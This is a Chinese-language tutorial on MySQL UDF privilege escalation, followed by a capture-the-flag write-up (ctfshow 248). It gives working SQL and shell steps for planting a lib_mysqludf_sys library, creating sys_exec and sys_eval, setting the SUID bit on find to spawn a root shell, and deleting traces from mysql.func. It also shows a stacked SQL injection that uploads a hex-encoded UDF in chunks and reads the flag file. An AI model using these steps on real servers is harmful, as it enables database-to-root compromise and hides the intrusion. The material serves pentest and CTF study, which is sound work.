UDF提权的基础

什么是udf

udf 全称为：user defined function，即用户自定义函数；
用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 contact()，user()，version()等函数。

udf 文件在linux中后缀是so，windows中是dll，由C、C++编写

udf提权的作用

渗透过程中，拿下一台低权限的windows服务器时，有些操作无法进行，而此时本地恰好存在mysql数据库，且mysql是root权限 (windows中mysql一般都是管理员权限)，就可以通过新建管理员用户等操作实现提权即udf提权，也可以称为通过mysql获得管理员权限。

udf提权的利用条件以及数据库版本问题

获得一个数据库账号，拥有MySQL的insert和delete权限，最好是root。
拥有将udf.dll写入相应目录的权限。

使用的函数：

sys_eval，执行任意命令，并将输出返回。sys_exec，执行任意命令，并将退出码返回。sys_get，获取一个环境变量。sys_set，创建或修改一个环境变量。


udf利用的其中一步，是要将我们的xxx.dll文件上传到mysql检索目录中，mysql各版本的检索目录有所不同：

其中当mysql的版本大于5.1的时候，其中lib、plugin文件夹一般需要自己创建。

创建方法：

select @@basedir;  //查找到mysql的目录 select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION';    //利用NTFS ADS创建lib目录 select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION';    //利用NTFS ADS创建plugin目录

1.新建一个表，名为myfunc，用于存放本地传来的udf文件的内容。

use mysql; 创建数据表myfunccreate table myfunc(line blob);



2.在myfunc表中写入内容

插入load_file读取的lib_mysqludf_sys_64.so“二进制”数据

insert into myfunc values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));



3.将表中内容传入目标路径的udf文件中
使用dumpfile函数把文件导出

outfile 多行导出，dumpfile一行导出

outfile会有特殊的转换，而dumpfile是原数据导出

select * from myfunc into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';



4.创建自定义函数do_system 类型是integer，别名（soname）文件名字

create function do_system returns integer soname 'lib_mysqludf_sys_64.so';



报错了，提示do_system函数不存在
ERROR 1305 (42000): FUNCTION mysql.do_system does not exist
换一个，使用sys_exec 函数

create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';



5.查询一下添加的函数

select * from mysql.func;



6.利用自定义函数改变find命令权限

select sys_exec('chmod u+s /usr/bin/find');



7.find提权：

find . hello -exec "/bin/sh" \; 在当前目录下找到hello文件夹执行/bin/sh提权，反斜杠 \ 代表结束的标志，与”/bin/sh“ 之间有一个空格



8.删除痕迹

drop function sys_exec;Delete from mysql.func where name='sys_exec';



ctfshow 248（hex编/解传入mysql系统提权）

这一题同样是利用udf，不过利用的方式不一样，这里是将从sqlmap或者msf中拿出来的udf文件经过hex编码，利用函数上传至网站后台。

udf文件转hex的方法：
进入mysql后，输入以下编码，利用hex函数转化。
select hex(load_file('C:/udf.so')) into dumpfile 'C:/udf.txt'
得到一串16进制编码

而这一题的话首先可以知道是堆叠注入，由于16进制字符串超出url长度的限制（get传参），于是分为三段上传。

id=1';select @@plugin_dir%23可以看到mysql的根路径:/usr/lib/mariadb/plugin/


向路径中传入三段udf 16进制文本

select '16进制文本' into dumpfile '/usr/lib/mariadb/plugin/X.txt'

判断是否以及插入：

select load_file('/usr/lib/mariadb/plugin/a.txt')


按照这个方法，确定三个部分的内容都插入目标路径后，将三部分hex解码再拼接回来传到mysql根路径下，转化为udf.so文件

select unhex(concat(load_file('/usr/lib/mariadb/plugin/a.txt'),load_file('/usr/lib/mariadb/plugin/b.txt'),load_file('/usr/lib/mariadb/plugin/c.txt'),load_file('/usr/lib/mariadb/plugin/d.txt'))) into dumpfile '/usr/lib/mariadb/plugin/udf.so'


最后就是创建自定函数并执行即可得到flag

create function sys_eval returns string soname 'udf.so'id=1';select sys_eval("cat /fla*")%23
